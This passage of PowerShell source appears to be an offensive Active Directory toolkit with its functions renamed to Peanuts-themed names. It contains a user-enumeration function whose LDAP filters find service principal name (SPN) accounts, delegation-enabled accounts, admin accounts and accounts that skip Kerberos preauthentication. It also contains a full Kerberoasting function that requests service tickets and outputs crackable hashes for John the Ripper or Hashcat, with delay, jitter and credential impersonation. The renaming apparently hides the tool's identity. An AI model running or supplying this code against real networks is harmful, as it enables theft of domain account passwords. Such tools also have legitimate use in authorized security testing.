                    $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($ConvertedIdentityInstance) {
                        $UserDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                        $UserName = $IdentityInstance.Split('\')[1]
                        $IdentityFilter += "(samAccountName=$UserName)"
                        $SearcherArguments['Domain'] = $UserDomain
                        Write-Verbose "[Get-NeighborhoodKid] Extracted domain '$UserDomain' from '$IdentityInstance'"
                        $UserSearcher = Get-SnoopyDoghouse @SearcherArguments
                    }
                }
                else {
                    $IdentityFilter += "(samAccountName=$IdentityInstance)"
                }
            }

            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[Get-NeighborhoodKid] Searching for non-null service principal names'
                $Filter += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[Get-NeighborhoodKid] Searching for users who can be delegated'
                # negation of "Accounts that are sensitive and not trusted for delegation"
                $Filter += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[Get-NeighborhoodKid] Searching for users who are sensitive and not trusted for delegation'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[Get-NeighborhoodKid] Searching for adminCount=1'
                $Filter += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[Get-NeighborhoodKid] Searching for users that are trusted to authenticate for other principals'
                $Filter += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[Get-NeighborhoodKid] Searching for user accounts that do not require kerberos preauthenticate'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-NeighborhoodKid] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            # build the LDAP filter for the dynamic UAC filter value
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            $UserSearcher.filter = "(&(samAccountType=805306368)$Filter)"
            Write-Verbose "[Get-NeighborhoodKid] filter string: $($UserSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $UserSearcher.FindOne() }
            else { $Results = $UserSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # return raw result objects
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, 'Peanuts.Kid.Raw')
                }
                else {
                    $User = Convert-WoodstockChirp -Properties $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'Peanuts.Kid')
                }
                $User
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-NeighborhoodKid] Error disposing of the Results object: $_"
                }
            }
            $UserSearcher.dispose()
        }
    }
}


function Invoke-SupperDance {
<#
.SYNOPSIS
Requests service tickets for accounts with service principal names and returns extracted ticket hashes.
Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf, Get-NeighborhoodKid, Get-GreatPumpkinTicket  
.DESCRIPTION
Uses Get-NeighborhoodKid to query for user accounts with non-null service principle
names (SPNs) and uses Get-GreatPumpkinTicket to request/extract the crackable ticket information.
The ticket format can be specified with -OutputFormat <John/Hashcat>.
.PARAMETER Identity
A SamAccountName (e.g. charlie), DistinguishedName (e.g. CN=charlie,CN=Users,DC=peanuts,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.
.PARAMETER Domain
Specifies the domain to use for the query, defaults to the current domain.
.PARAMETER LDAPFilter
Specifies an LDAP query string that is used to filter Active Directory objects.
.PARAMETER SearchBase
The LDAP source to search through, e.g. "LDAP://OU=secret,DC=peanuts,DC=local"
Useful for OU queries.
.PARAMETER Server
Specifies an Active Directory server (domain controller) to bind to.
.PARAMETER SearchScope
Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
.PARAMETER ResultPageSize
Specifies the PageSize to set for the LDAP searcher object.
.PARAMETER ServerTimeLimit
Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
.PARAMETER Tombstone
Switch. Specifies that the searcher should also return deleted/tombstoned objects.
.PARAMETER OutputFormat
Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format.
Defaults to 'John'.
.PARAMETER Credential
A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.
.PARAMETER Delay
Specifies the delay in seconds between ticket requests.
.PARAMETER Jitter
Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3
.EXAMPLE
Invoke-SupperDance | fl
Requests tickets for all found SPNs for the current domain.
.EXAMPLE
Invoke-SupperDance -Domain dev.peanuts.local -OutputFormat HashCat | fl
Requests tickets for all found SPNs for the peanuts.local domain, outputting to HashCat
format instead of John (the default).
.EXAMPLE
$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -orce
$Cred = New-Object System.Management.Automation.PSCredential('PEANUTS\linus', $SecPassword)
Invoke-SupperDance -Credential $Cred -Verbose -Domain peanuts.local | fl
Requests tickets for all found SPNs for the peanuts.local domain using alternate credentials.
.OUTPUTS
Peanuts.PumpkinTicket
Outputs a custom object containing the SamAccountName, ServicePrincipalName, and encrypted ticket section.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('Peanuts.PumpkinTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [ValidateRange(0,10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = 'John',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $UserSearcherArguments = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $UserSearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $UserSearcherArguments['Identity'] = $Identity }
        Get-NeighborhoodKid @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Get-GreatPumpkinTicket -Delay $Delay -OutputFormat $OutputFormat -Jitter $Jitter
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}